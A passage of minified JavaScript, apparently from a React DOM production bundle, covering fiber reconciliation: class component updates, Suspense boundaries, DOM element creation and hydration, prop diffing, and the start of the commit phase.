        var d = n.getDerivedStateFromProps,
            h = typeof d == "function" || typeof o.getSnapshotBeforeUpdate == "function";
        h || typeof o.UNSAFE_componentWillReceiveProps != "function" && typeof o.componentWillReceiveProps != "function" || (i !== r || s !== u) && Hs(t, o, r, u), Ct = !1;
        var v = t.memoizedState;
        o.state = v, Hl(t, r, o, l), s = t.memoizedState, i !== r || v !== s || Ne.current || Ct ? (typeof d == "function" && (jo(t, n, d, r), s = t.memoizedState), (i = Ct || Us(t, n, i, r, v, s, u)) ? (h || typeof o.UNSAFE_componentWillMount != "function" && typeof o.componentWillMount != "function" || (typeof o.componentWillMount == "function" && o.componentWillMount(), typeof o.UNSAFE_componentWillMount == "function" && o.UNSAFE_componentWillMount()), typeof o.componentDidMount == "function" && (t.flags |= 4194308)) : (typeof o.componentDidMount == "function" && (t.flags |= 4194308), t.memoizedProps = r, t.memoizedState = s), o.props = r, o.state = s, o.context = u, r = i) : (typeof o.componentDidMount == "function" && (t.flags |= 4194308), r = !1)
    } else {
        o = t.stateNode, Lc(e, t), i = t.memoizedProps, u = t.type === t.elementType ? i : Xe(t.type, i), o.props = u, h = t.pendingProps, v = o.context, s = n.contextType, typeof s == "object" && s !== null ? s = Be(s) : (s = Ce(n) ? an : ve.current, s = zn(t, s));
        var y = n.getDerivedStateFromProps;
        (d = typeof y == "function" || typeof o.getSnapshotBeforeUpdate == "function") || typeof o.UNSAFE_componentWillReceiveProps != "function" && typeof o.componentWillReceiveProps != "function" || (i !== h || v !== s) && Hs(t, o, r, s), Ct = !1, v = t.memoizedState, o.state = v, Hl(t, r, o, l);
        var w = t.memoizedState;
        i !== h || v !== w || Ne.current || Ct ? (typeof y == "function" && (jo(t, n, y, r), w = t.memoizedState), (u = Ct || Us(t, n, u, r, v, w, s) || !1) ? (d || typeof o.UNSAFE_componentWillUpdate != "function" && typeof o.componentWillUpdate != "function" || (typeof o.componentWillUpdate == "function" && o.componentWillUpdate(r, w, s), typeof o.UNSAFE_componentWillUpdate == "function" && o.UNSAFE_componentWillUpdate(r, w, s)), typeof o.componentDidUpdate == "function" && (t.flags |= 4), typeof o.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024)) : (typeof o.componentDidUpdate != "function" || i === e.memoizedProps && v === e.memoizedState || (t.flags |= 4), typeof o.getSnapshotBeforeUpdate != "function" || i === e.memoizedProps && v === e.memoizedState || (t.flags |= 1024), t.memoizedProps = r, t.memoizedState = w), o.props = r, o.state = w, o.context = s, r = u) : (typeof o.componentDidUpdate != "function" || i === e.memoizedProps && v === e.memoizedState || (t.flags |= 4), typeof o.getSnapshotBeforeUpdate != "function" || i === e.memoizedProps && v === e.memoizedState || (t.flags |= 1024), r = !1)
    }
    return Fo(e, t, n, r, a, l)
}

function Fo(e, t, n, r, l, a) {
    od(e, t);
    var o = (t.flags & 128) !== 0;
    if (!r && !o) return l && zs(t, n, !1), kt(e, t, a);
    r = t.stateNode, nm.current = t;
    var i = o && typeof n.getDerivedStateFromError != "function" ? null : r.render();
    return t.flags |= 1, e !== null && o ? (t.child = In(t, e.child, null, a), t.child = In(t, null, i, a)) : ye(e, t, i, a), t.memoizedState = r.state, l && zs(t, n, !0), t.child
}

function id(e) {
    var t = e.stateNode;
    t.pendingContext ? Ms(e, t.pendingContext, t.pendingContext !== t.context) : t.context && Ms(e, t.context, !1), Ni(e, t.containerInfo)
}

function qs(e, t, n, r, l) {
    return Dn(), wi(l), t.flags |= 256, ye(e, t, n, r), t.child
}
var Oo = {
    dehydrated: null,
    treeContext: null,
    retryLane: 0
};

function Ro(e) {
    return {
        baseLanes: e,
        cachePool: null,
        transitions: null
    }
}

function sd(e, t, n) {
    var r = t.pendingProps,
        l = Q.current,
        a = !1,
        o = (t.flags & 128) !== 0,
        i;
    if ((i = o) || (i = e !== null && e.memoizedState === null ? !1 : (l & 2) !== 0), i ? (a = !0, t.flags &= -129) : (e === null || e.memoizedState !== null) && (l |= 1), U(Q, l & 1), e === null) return To(t), e = t.memoizedState, e !== null && (e = e.dehydrated, e !== null) ? (t.mode & 1 ? e.data === "$!" ? t.lanes = 8 : t.lanes = 1073741824 : t.lanes = 1, null) : (o = r.children, e = r.fallback, a ? (r = t.mode, a = t.child, o = {
        mode: "hidden",
        children: o
    }, !(r & 1) && a !== null ? (a.childLanes = 0, a.pendingProps = o) : a = da(o, r, 0, null), e = rn(e, r, n, null), a.return = t, e.return = t, a.sibling = e, t.child = a, t.child.memoizedState = Ro(n), t.memoizedState = Oo, e) : Fi(t, o));
    if (l = e.memoizedState, l !== null && (i = l.dehydrated, i !== null)) return rm(e, t, o, r, i, l, n);
    if (a) {
        a = r.fallback, o = t.mode, l = e.child, i = l.sibling;
        var s = {
            mode: "hidden",
            children: r.children
        };
        return !(o & 1) && t.child !== l ? (r = t.child, r.childLanes = 0, r.pendingProps = s, t.deletions = null) : (r = At(l, s), r.subtreeFlags = l.subtreeFlags & 14680064), i !== null ? a = At(i, a) : (a = rn(a, o, n, null), a.flags |= 2), a.return = t, r.return = t, r.sibling = a, t.child = r, r = a, a = t.child, o = e.child.memoizedState, o = o === null ? Ro(n) : {
            baseLanes: o.baseLanes | n,
            cachePool: null,
            transitions: o.transitions
        }, a.memoizedState = o, a.childLanes = e.childLanes & ~n, t.memoizedState = Oo, r
    }
    return a = e.child, e = a.sibling, r = At(a, {
        mode: "visible",
        children: r.children
    }), !(t.mode & 1) && (r.lanes = n), r.return = t, r.sibling = null, e !== null && (n = t.deletions, n === null ? (t.deletions = [e], t.flags |= 16) : n.push(e)), t.child = r, t.memoizedState = null, r
}

function Fi(e, t) {
    return t = da({
        mode: "visible",
        children: t
    }, e.mode, 0, null), t.return = e, e.child = t
}

function ul(e, t, n, r) {
    return r !== null && wi(r), In(t, e.child, null, n), e = Fi(t, t.pendingProps.children), e.flags |= 2, t.memoizedState = null, e
}

function rm(e, t, n, r, l, a, o) {
    if (n) return t.flags & 256 ? (t.flags &= -257, r = Wa(Error(b(422))), ul(e, t, o, r)) : t.memoizedState !== null ? (t.child = e.child, t.flags |= 128, null) : (a = r.fallback, l = t.mode, r = da({
        mode: "visible",
        children: r.children
    }, l, 0, null), a = rn(a, l, o, null), a.flags |= 2, r.return = t, a.return = t, r.sibling = a, t.child = r, t.mode & 1 && In(t, e.child, null, o), t.child.memoizedState = Ro(o), t.memoizedState = Oo, a);
    if (!(t.mode & 1)) return ul(e, t, o, null);
    if (l.data === "$!") {
        if (r = l.nextSibling && l.nextSibling.dataset, r) var i = r.dgst;
        return r = i, a = Error(b(419)), r = Wa(a, r, void 0), ul(e, t, o, r)
    }
    if (i = (o & e.childLanes) !== 0, Ee || i) {
        if (r = le, r !== null) {
            switch (o & -o) {
                case 4:
                    l = 2;
                    break;
                case 16:
                    l = 8;
                    break;
                case 64:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                case 67108864:
                    l = 32;
                    break;
                case 536870912:
                    l = 268435456;
                    break;
                default:
                    l = 0
            }
            l = l & (r.suspendedLanes | o) ? 0 : l, l !== 0 && l !== a.retryLane && (a.retryLane = l, xt(e, l), tt(r, e, l, -1))
        }
        return Ii(), r = Wa(Error(b(421))), ul(e, t, o, r)
    }
    return l.data === "$?" ? (t.flags |= 128, t.child = e.child, t = vm.bind(null, e), l._reactRetry = t, null) : (e = a.treeContext, $e = Mt(l.nextSibling), Fe = t, V = !0, Je = null, e !== null && (Ie[Ae++] = mt, Ie[Ae++] = ht, Ie[Ae++] = on, mt = e.id, ht = e.overflow, on = t), t = Fi(t, r.children), t.flags |= 4096, t)
}

function eu(e, t, n) {
    e.lanes |= t;
    var r = e.alternate;
    r !== null && (r.lanes |= t), Po(e.return, t, n)
}

function Ua(e, t, n, r, l) {
    var a = e.memoizedState;
    a === null ? e.memoizedState = {
        isBackwards: t,
        rendering: null,
        renderingStartTime: 0,
        last: r,
        tail: n,
        tailMode: l
    } : (a.isBackwards = t, a.rendering = null, a.renderingStartTime = 0, a.last = r, a.tail = n, a.tailMode = l)
}

function ud(e, t, n) {
    var r = t.pendingProps,
        l = r.revealOrder,
        a = r.tail;
    if (ye(e, t, r.children, n), r = Q.current, r & 2) r = r & 1 | 2, t.flags |= 128;
    else {
        if (e !== null && e.flags & 128) e: for (e = t.child; e !== null;) {
            if (e.tag === 13) e.memoizedState !== null && eu(e, n, t);
            else if (e.tag === 19) eu(e, n, t);
            else if (e.child !== null) {
                e.child.return = e, e = e.child;
                continue
            }
            if (e === t) break e;
            for (; e.sibling === null;) {
                if (e.return === null || e.return === t) break e;
                e = e.return
            }
            e.sibling.return = e.return, e = e.sibling
        }
        r &= 1
    }
    if (U(Q, r), !(t.mode & 1)) t.memoizedState = null;
    else switch (l) {
        case "forwards":
            for (n = t.child, l = null; n !== null;) e = n.alternate, e !== null && Bl(e) === null && (l = n), n = n.sibling;
            n = l, n === null ? (l = t.child, t.child = null) : (l = n.sibling, n.sibling = null), Ua(t, !1, l, n, a);
            break;
        case "backwards":
            for (n = null, l = t.child, t.child = null; l !== null;) {
                if (e = l.alternate, e !== null && Bl(e) === null) {
                    t.child = l;
                    break
                }
                e = l.sibling, l.sibling = n, n = l, l = e
            }
            Ua(t, !0, n, null, a);
            break;
        case "together":
            Ua(t, !1, null, null, void 0);
            break;
        default:
            t.memoizedState = null
    }
    return t.child
}

function Sl(e, t) {
    !(t.mode & 1) && e !== null && (e.alternate = null, t.alternate = null, t.flags |= 2)
}

function kt(e, t, n) {
    if (e !== null && (t.dependencies = e.dependencies), un |= t.lanes, !(n & t.childLanes)) return null;
    if (e !== null && t.child !== e.child) throw Error(b(153));
    if (t.child !== null) {
        for (e = t.child, n = At(e, e.pendingProps), t.child = n, n.return = t; e.sibling !== null;) e = e.sibling, n = n.sibling = At(e, e.pendingProps), n.return = t;
        n.sibling = null
    }
    return t.child
}

function lm(e, t, n) {
    switch (t.tag) {
        case 3:
            id(t), Dn();
            break;
        case 5:
            Mc(t);
            break;
        case 1:
            Ce(t.type) && Dl(t);
            break;
        case 4:
            Ni(t, t.stateNode.containerInfo);
            break;
        case 10:
            var r = t.type._context,
                l = t.memoizedProps.value;
            U(Wl, r._currentValue), r._currentValue = l;
            break;
        case 13:
            if (r = t.memoizedState, r !== null) return r.dehydrated !== null ? (U(Q, Q.current & 1), t.flags |= 128, null) : n & t.child.childLanes ? sd(e, t, n) : (U(Q, Q.current & 1), e = kt(e, t, n), e !== null ? e.sibling : null);
            U(Q, Q.current & 1);
            break;
        case 19:
            if (r = (n & t.childLanes) !== 0, e.flags & 128) {
                if (r) return ud(e, t, n);
                t.flags |= 128
            }
            if (l = t.memoizedState, l !== null && (l.rendering = null, l.tail = null, l.lastEffect = null), U(Q, Q.current), r) break;
            return null;
        case 22:
        case 23:
            return t.lanes = 0, ad(e, t, n)
    }
    return kt(e, t, n)
}
var cd, Mo, dd, fd;
cd = function(e, t) {
    for (var n = t.child; n !== null;) {
        if (n.tag === 5 || n.tag === 6) e.appendChild(n.stateNode);
        else if (n.tag !== 4 && n.child !== null) {
            n.child.return = n, n = n.child;
            continue
        }
        if (n === t) break;
        for (; n.sibling === null;) {
            if (n.return === null || n.return === t) return;
            n = n.return
        }
        n.sibling.return = n.return, n = n.sibling
    }
};
Mo = function() {};
dd = function(e, t, n, r) {
    var l = e.memoizedProps;
    if (l !== r) {
        e = t.stateNode, en(st.current);
        var a = null;
        switch (n) {
            case "input":
                l = ro(e, l), r = ro(e, r), a = [];
                break;
            case "select":
                l = Y({}, l, {
                    value: void 0
                }), r = Y({}, r, {
                    value: void 0
                }), a = [];
                break;
            case "textarea":
                l = oo(e, l), r = oo(e, r), a = [];
                break;
            default:
                typeof l.onClick != "function" && typeof r.onClick == "function" && (e.onclick = Ml)
        }
        so(n, r);
        var o;
        n = null;
        for (u in l)
            if (!r.hasOwnProperty(u) && l.hasOwnProperty(u) && l[u] != null)
                if (u === "style") {
                    var i = l[u];
                    for (o in i) i.hasOwnProperty(o) && (n || (n = {}), n[o] = "")
                } else u !== "dangerouslySetInnerHTML" && u !== "children" && u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && u !== "autoFocus" && (kr.hasOwnProperty(u) ? a || (a = []) : (a = a || []).push(u, null));
        for (u in r) {
            var s = r[u];
            if (i = l != null ? l[u] : void 0, r.hasOwnProperty(u) && s !== i && (s != null || i != null))
                if (u === "style")
                    if (i) {
                        for (o in i) !i.hasOwnProperty(o) || s && s.hasOwnProperty(o) || (n || (n = {}), n[o] = "");
                        for (o in s) s.hasOwnProperty(o) && i[o] !== s[o] && (n || (n = {}), n[o] = s[o])
                    } else n || (a || (a = []), a.push(u, n)), n = s;
            else u === "dangerouslySetInnerHTML" ? (s = s ? s.__html : void 0, i = i ? i.__html : void 0, s != null && i !== s && (a = a || []).push(u, s)) : u === "children" ? typeof s != "string" && typeof s != "number" || (a = a || []).push(u, "" + s) : u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && (kr.hasOwnProperty(u) ? (s != null && u === "onScroll" && H("scroll", e), a || i === s || (a = [])) : (a = a || []).push(u, s))
        }
        n && (a = a || []).push("style", n);
        var u = a;
        (t.updateQueue = u) && (t.flags |= 4)
    }
};
fd = function(e, t, n, r) {
    n !== r && (t.flags |= 4)
};

function nr(e, t) {
    if (!V) switch (e.tailMode) {
        case "hidden":
            t = e.tail;
            for (var n = null; t !== null;) t.alternate !== null && (n = t), t = t.sibling;
            n === null ? e.tail = null : n.sibling = null;
            break;
        case "collapsed":
            n = e.tail;
            for (var r = null; n !== null;) n.alternate !== null && (r = n), n = n.sibling;
            r === null ? t || e.tail === null ? e.tail = null : e.tail.sibling = null : r.sibling = null
    }
}

function me(e) {
    var t = e.alternate !== null && e.alternate.child === e.child,
        n = 0,
        r = 0;
    if (t)
        for (var l = e.child; l !== null;) n |= l.lanes | l.childLanes, r |= l.subtreeFlags & 14680064, r |= l.flags & 14680064, l.return = e, l = l.sibling;
    else
        for (l = e.child; l !== null;) n |= l.lanes | l.childLanes, r |= l.subtreeFlags, r |= l.flags, l.return = e, l = l.sibling;
    return e.subtreeFlags |= r, e.childLanes = n, t
}

function am(e, t, n) {
    var r = t.pendingProps;
    switch (yi(t), t.tag) {
        case 2:
        case 16:
        case 15:
        case 0:
        case 11:
        case 7:
        case 8:
        case 12:
        case 9:
        case 14:
            return me(t), null;
        case 1:
            return Ce(t.type) && zl(), me(t), null;
        case 3:
            return r = t.stateNode, An(), B(Ne), B(ve), Ti(), r.pendingContext && (r.context = r.pendingContext, r.pendingContext = null), (e === null || e.child === null) && (il(t) ? t.flags |= 4 : e === null || e.memoizedState.isDehydrated && !(t.flags & 256) || (t.flags |= 1024, Je !== null && (Bo(Je), Je = null))), Mo(e, t), me(t), null;
        case 5:
            Ci(t);
            var l = en(Fr.current);
            if (n = t.type, e !== null && t.stateNode != null) dd(e, t, n, r, l), e.ref !== t.ref && (t.flags |= 512, t.flags |= 2097152);
            else {
                if (!r) {
                    if (t.stateNode === null) throw Error(b(166));
                    return me(t), null
                }
                if (e = en(st.current), il(t)) {
                    r = t.stateNode, n = t.type;
                    var a = t.memoizedProps;
                    switch (r[ot] = t, r[Lr] = a, e = (t.mode & 1) !== 0, n) {
                        case "dialog":
                            H("cancel", r), H("close", r);
                            break;
                        case "iframe":
                        case "object":
                        case "embed":
                            H("load", r);
                            break;
                        case "video":
                        case "audio":
                            for (l = 0; l < ur.length; l++) H(ur[l], r);
                            break;
                        case "source":
                            H("error", r);
                            break;
                        case "img":
                        case "image":
                        case "link":
                            H("error", r), H("load", r);
                            break;
                        case "details":
                            H("toggle", r);
                            break;
                        case "input":
                            us(r, a), H("invalid", r);
                            break;
                        case "select":
                            r._wrapperState = {
                                wasMultiple: !!a.multiple
                            }, H("invalid", r);
                            break;
                        case "textarea":
                            ds(r, a), H("invalid", r)
                    }
                    so(n, a), l = null;
                    for (var o in a)
                        if (a.hasOwnProperty(o)) {
                            var i = a[o];
                            o === "children" ? typeof i == "string" ? r.textContent !== i && (a.suppressHydrationWarning !== !0 && ol(r.textContent, i, e), l = ["children", i]) : typeof i == "number" && r.textContent !== "" + i && (a.suppressHydrationWarning !== !0 && ol(r.textContent, i, e), l = ["children", "" + i]) : kr.hasOwnProperty(o) && i != null && o === "onScroll" && H("scroll", r)
                        }
                    switch (n) {
                        case "input":
                            Jr(r), cs(r, a, !0);
                            break;
                        case "textarea":
                            Jr(r), fs(r);
                            break;
                        case "select":
                        case "option":
                            break;
                        default:
                            typeof a.onClick == "function" && (r.onclick = Ml)
                    }
                    r = l, t.updateQueue = r, r !== null && (t.flags |= 4)
                } else {
                    o = l.nodeType === 9 ? l : l.ownerDocument, e === "http://www.w3.org/1999/xhtml" && (e = Iu(n)), e === "http://www.w3.org/1999/xhtml" ? n === "script" ? (e = o.createElement("div"), e.innerHTML = "<script><\/script>", e = e.removeChild(e.firstChild)) : typeof r.is == "string" ? e = o.createElement(n, {
                        is: r.is
                    }) : (e = o.createElement(n), n === "select" && (o = e, r.multiple ? o.multiple = !0 : r.size && (o.size = r.size))) : e = o.createElementNS(e, n), e[ot] = t, e[Lr] = r, cd(e, t, !1, !1), t.stateNode = e;
                    e: {
                        switch (o = uo(n, r), n) {
                            case "dialog":
                                H("cancel", e), H("close", e), l = r;
                                break;
                            case "iframe":
                            case "object":
                            case "embed":
                                H("load", e), l = r;
                                break;
                            case "video":
                            case "audio":
                                for (l = 0; l < ur.length; l++) H(ur[l], e);
                                l = r;
                                break;
                            case "source":
                                H("error", e), l = r;
                                break;
                            case "img":
                            case "image":
                            case "link":
                                H("error", e), H("load", e), l = r;
                                break;
                            case "details":
                                H("toggle", e), l = r;
                                break;
                            case "input":
                                us(e, r), l = ro(e, r), H("invalid", e);
                                break;
                            case "option":
                                l = r;
                                break;
                            case "select":
                                e._wrapperState = {
                                    wasMultiple: !!r.multiple
                                }, l = Y({}, r, {
                                    value: void 0
                                }), H("invalid", e);
                                break;
                            case "textarea":
                                ds(e, r), l = oo(e, r), H("invalid", e);
                                break;
                            default:
                                l = r
                        }
                        so(n, l),
                        i = l;
                        for (a in i)
                            if (i.hasOwnProperty(a)) {
                                var s = i[a];
                                a === "style" ? Uu(e, s) : a === "dangerouslySetInnerHTML" ? (s = s ? s.__html : void 0, s != null && Au(e, s)) : a === "children" ? typeof s == "string" ? (n !== "textarea" || s !== "") && br(e, s) : typeof s == "number" && br(e, "" + s) : a !== "suppressContentEditableWarning" && a !== "suppressHydrationWarning" && a !== "autoFocus" && (kr.hasOwnProperty(a) ? s != null && a === "onScroll" && H("scroll", e) : s != null && ri(e, a, s, o))
                            }
                        switch (n) {
                            case "input":
                                Jr(e), cs(e, r, !1);
                                break;
                            case "textarea":
                                Jr(e), fs(e);
                                break;
                            case "option":
                                r.value != null && e.setAttribute("value", "" + Wt(r.value));
                                break;
                            case "select":
                                e.multiple = !!r.multiple, a = r.value, a != null ? _n(e, !!r.multiple, a, !1) : r.defaultValue != null && _n(e, !!r.multiple, r.defaultValue, !0);
                                break;
                            default:
                                typeof l.onClick == "function" && (e.onclick = Ml)
                        }
                        switch (n) {
                            case "button":
                            case "input":
                            case "select":
                            case "textarea":
                                r = !!r.autoFocus;
                                break e;
                            case "img":
                                r = !0;
                                break e;
                            default:
                                r = !1
                        }
                    }
                    r && (t.flags |= 4)
                }
                t.ref !== null && (t.flags |= 512, t.flags |= 2097152)
            }
            return me(t), null;
        case 6:
            if (e && t.stateNode != null) fd(e, t, e.memoizedProps, r);
            else {
                if (typeof r != "string" && t.stateNode === null) throw Error(b(166));
                if (n = en(Fr.current), en(st.current), il(t)) {
                    if (r = t.stateNode, n = t.memoizedProps, r[ot] = t, (a = r.nodeValue !== n) && (e = Fe, e !== null)) switch (e.tag) {
                        case 3:
                            ol(r.nodeValue, n, (e.mode & 1) !== 0);
                            break;
                        case 5:
                            e.memoizedProps.suppressHydrationWarning !== !0 && ol(r.nodeValue, n, (e.mode & 1) !== 0)
                    }
                    a && (t.flags |= 4)
                } else r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r), r[ot] = t, t.stateNode = r
            }
            return me(t), null;
        case 13:
            if (B(Q), r = t.memoizedState, e === null || e.memoizedState !== null && e.memoizedState.dehydrated !== null) {
                if (V && $e !== null && t.mode & 1 && !(t.flags & 128)) jc(), Dn(), t.flags |= 98560, a = !1;
                else if (a = il(t), r !== null && r.dehydrated !== null) {
                    if (e === null) {
                        if (!a) throw Error(b(318));
                        if (a = t.memoizedState, a = a !== null ? a.dehydrated : null, !a) throw Error(b(317));
                        a[ot] = t
                    } else Dn(), !(t.flags & 128) && (t.memoizedState = null), t.flags |= 4;
                    me(t), a = !1
                } else Je !== null && (Bo(Je), Je = null), a = !0;
                if (!a) return t.flags & 65536 ? t : null
            }
            return t.flags & 128 ? (t.lanes = n, t) : (r = r !== null, r !== (e !== null && e.memoizedState !== null) && r && (t.child.flags |= 8192, t.mode & 1 && (e === null || Q.current & 1 ? te === 0 && (te = 3) : Ii())), t.updateQueue !== null && (t.flags |= 4), me(t), null);
        case 4:
            return An(), Mo(e, t), e === null && jr(t.stateNode.containerInfo), me(t), null;
        case 10:
            return bi(t.type._context), me(t), null;
        case 17:
            return Ce(t.type) && zl(), me(t), null;
        case 19:
            if (B(Q), a = t.memoizedState, a === null) return me(t), null;
            if (r = (t.flags & 128) !== 0, o = a.rendering, o === null)
                if (r) nr(a, !1);
                else {
                    if (te !== 0 || e !== null && e.flags & 128)
                        for (e = t.child; e !== null;) {
                            if (o = Bl(e), o !== null) {
                                for (t.flags |= 128, nr(a, !1), r = o.updateQueue, r !== null && (t.updateQueue = r, t.flags |= 4), t.subtreeFlags = 0, r = n, n = t.child; n !== null;) a = n, e = r, a.flags &= 14680066, o = a.alternate, o === null ? (a.childLanes = 0, a.lanes = e, a.child = null, a.subtreeFlags = 0, a.memoizedProps = null, a.memoizedState = null, a.updateQueue = null, a.dependencies = null, a.stateNode = null) : (a.childLanes = o.childLanes, a.lanes = o.lanes, a.child = o.child, a.subtreeFlags = 0, a.deletions = null, a.memoizedProps = o.memoizedProps, a.memoizedState = o.memoizedState, a.updateQueue = o.updateQueue, a.type = o.type, e = o.dependencies, a.dependencies = e === null ? null : {
                                    lanes: e.lanes,
                                    firstContext: e.firstContext
                                }), n = n.sibling;
                                return U(Q, Q.current & 1 | 2), t.child
                            }
                            e = e.sibling
                        }
                    a.tail !== null && X() > Un && (t.flags |= 128, r = !0, nr(a, !1), t.lanes = 4194304)
                }
            else {
                if (!r)
                    if (e = Bl(o), e !== null) {
                        if (t.flags |= 128, r = !0, n = e.updateQueue, n !== null && (t.updateQueue = n, t.flags |= 4), nr(a, !0), a.tail === null && a.tailMode === "hidden" && !o.alternate && !V) return me(t), null
                    } else 2 * X() - a.renderingStartTime > Un && n !== 1073741824 && (t.flags |= 128, r = !0, nr(a, !1), t.lanes = 4194304);
                a.isBackwards ? (o.sibling = t.child, t.child = o) : (n = a.last, n !== null ? n.sibling = o : t.child = o, a.last = o)
            }
            return a.tail !== null ? (t = a.tail, a.rendering = t, a.tail = t.sibling, a.renderingStartTime = X(), t.sibling = null, n = Q.current, U(Q, r ? n & 1 | 2 : n & 1), t) : (me(t), null);
        case 22:
        case 23:
            return Di(), r = t.memoizedState !== null, e !== null && e.memoizedState !== null !== r && (t.flags |= 8192), r && t.mode & 1 ? _e & 1073741824 && (me(t), t.subtreeFlags & 6 && (t.flags |= 8192)) : me(t), null;
        case 24:
            return null;
        case 25:
            return null
    }
    throw Error(b(156, t.tag))
}

function om(e, t) {
    switch (yi(t), t.tag) {
        case 1:
            return Ce(t.type) && zl(), e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
        case 3:
            return An(), B(Ne), B(ve), Ti(), e = t.flags, e & 65536 && !(e & 128) ? (t.flags = e & -65537 | 128, t) : null;
        case 5:
            return Ci(t), null;
        case 13:
            if (B(Q), e = t.memoizedState, e !== null && e.dehydrated !== null) {
                if (t.alternate === null) throw Error(b(340));
                Dn()
            }
            return e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
        case 19:
            return B(Q), null;
        case 4:
            return An(), null;
        case 10:
            return bi(t.type._context), null;
        case 22:
        case 23:
            return Di(), null;
        case 24:
            return null;
        default:
            return null
    }
}
var cl = !1,
    he = !1,
    im = typeof WeakSet == "function" ? WeakSet : Set,
    _ = null;

function Cn(e, t) {
    var n = e.ref;
    if (n !== null)
        if (typeof n == "function") try {
            n(null)
        } catch (r) {
            G(e, t, r)
        } else n.current = null
}

function zo(e, t, n) {
    try {
        n()
    } catch (r) {
        G(e, t, r)
    }
}
var tu = !1;

function sm(e, t) {
    if (xo = Fl, e = vc(), vi(e)) {
        if ("selectionStart" in e) var n = {
            start: e.selectionStart,
            end: e.selectionEnd
        };
        else e: {
            n = (n = e.ownerDocument) && n.defaultView || window;
            var r = n.getSelection && n.getSelection();
            if (r && r.rangeCount !== 0) {
                n = r.anchorNode;
                var l = r.anchorOffset,
                    a = r.focusNode;
                r = r.focusOffset;
                try {
                    n.nodeType, a.nodeType
                } catch {
                    n = null;
                    break e
                }
                var o = 0,
                    i = -1,
                    s = -1,
                    u = 0,
                    d = 0,
                    h = e,
                    v = null;
                t: for (;;) {
                    for (var y; h !== n || l !== 0 && h.nodeType !== 3 || (i = o + l), h !== a || r !== 0 && h.nodeType !== 3 || (s = o + r), h.nodeType === 3 && (o += h.nodeValue.length), (y = h.firstChild) !== null;) v = h, h = y;
                    for (;;) {
                        if (h === e) break t;
                        if (v === n && ++u === l && (i = o), v === a && ++d === r && (s = o), (y = h.nextSibling) !== null) break;
                        h = v, v = h.parentNode
                    }
                    h = y
                }
                n = i === -1 || s === -1 ? null : {
                    start: i,
                    end: s
                }
            } else n = null
        }
        n = n || {
            start: 0,
            end: 0
        }
    } else n = null;
    for (ko = {
            focusedElem: e,
            selectionRange: n
        }, Fl = !1, _ = t; _ !== null;)
        if (t = _, e = t.child, (t.subtreeFlags & 1028) !== 0 && e !== null) e.return = t, _ = e;
        else
            for (; _ !== null;) {
                t = _;
                try {
                    var w = t.alternate;
                    if (t.flags & 1024) switch (t.tag) {
                        case 0:
                        case 11:
                        case 15:
                            break;
                        case 1:
                            if (w !== null) {
                                var x = w.memoizedProps,
                                    S = w.memoizedState,
                                    f = t.stateNode,
                                    c = f.getSnapshotBeforeUpdate(t.elementType === t.type ? x : Xe(t.type, x), S);
                                f.__reactInternalSnapshotBeforeUpdate = c
                            }
                            break;
                        case 3:
                            var m = t.stateNode.containerInfo;
                            m.nodeType === 1 ? m.textContent = "" : m.nodeType === 9 && m.documentElement && m.removeChild(m.documentElement);
                            break;
                        case 5:
                        case 6:
                        case 4:
                        case 17:
                            break;
                        default:
                            throw Error(b(163))
                    }
                } catch (k) {
                    G(t, t.return, k)
                }
                if (e = t.sibling, e !== null) {
                    e.return = t.return, _ = e;
                    break
                }
                _ = t.return
            }
    return w = tu, tu = !1, w
}

function gr(e, t, n) {
    var r = t.updateQueue;
    if (r = r !== null ? r.lastEffect : null, r !== null) {
        var l = r = r.next;
        do {
            if ((l.tag & e) === e) {
                var a = l.destroy;
                l.destroy = void 0, a !== void 0 && zo(t, n, a)
            }
            l = l.next
        } while (l !== r)
    }
}

function ua(e, t) {
    if (t = t.updateQueue, t = t !== null ? t.lastEffect : null, t !== null) {
        var n = t = t.next;
        do {
            if ((n.tag & e) === e) {
                var r = n.create;
                n.destroy = r()
            }
            n = n.next
        } while (n !== t)
    }
}

function Do(e) {
    var t = e.ref;
    if (t !== null) {
        var n = e.stateNode;
        switch (e.tag) {
            case 5:
                e = n;
                break;
            default:
                e = n
        }
        typeof t == "function" ? t(e) : t.current = e
    }
}

function pd(e) {
    var t = e.alternate;
    t !== null && (e.alternate = null, pd(t)), e.child = null, e.deletions = null, e.sibling = null, e.tag === 5 && (t = e.stateNode, t !== null && (delete t[ot], delete t[Lr], delete t[Eo], delete t[Bp], delete t[Vp])), e.stateNode = null, e.return = null, e.dependencies = null, e.memoizedProps = null, e.memoizedState = null, e.pendingProps = null, e.stateNode = null, e.updateQueue = null
}

function md(e) {
    return e.tag === 5 || e.tag === 3 || e.tag === 4
}

function nu(e) {
    e: for (;;) {
        for (; e.sibling === null;) {
            if (e.return === null || md(e.return)) return null;
            e = e.return
        }
        for (e.sibling.return = e.return, e = e.sibling; e.tag !== 5 && e.tag !== 6 && e.tag !== 18;) {
            if (e.flags & 2 || e.child === null || e.tag === 4) continue e;
            e.child.return = e, e = e.child
        }
        if (!(e.flags & 2)) return e.stateNode
    }
}

function Io(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6) e = e.stateNode, t ? n.nodeType === 8 ? n.parentNode.insertBefore(e, t) : n.insertBefore(e, t) : (n.nodeType === 8 ? (t = n.parentNode, t.insertBefore(e, n)) : (t = n, t.appendChild(e)), n = n._reactRootContainer, n != null || t.onclick !== null || (t.onclick = Ml));
    else if (r !== 4 && (e = e.child, e !== null))
        for (Io(e, t, n), e = e.sibling; e !== null;) Io(e, t, n), e = e.sibling
}

function Ao(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6) e = e.stateNode, t ? n.insertBefore(e, t) : n.appendChild(e);
    else if (r !== 4 && (e = e.child, e !== null))
        for (Ao(e, t, n), e = e.sibling; e !== null;) Ao(e, t, n), e = e.sibling
}
var se = null,
    Ze = !1;

function St(e, t, n) {
    for (n = n.child; n !== null;) hd(e, t, n), n = n.sibling
}

function hd(e, t, n) {
    if (it && typeof it.onCommitFiberUnmount == "function") try {
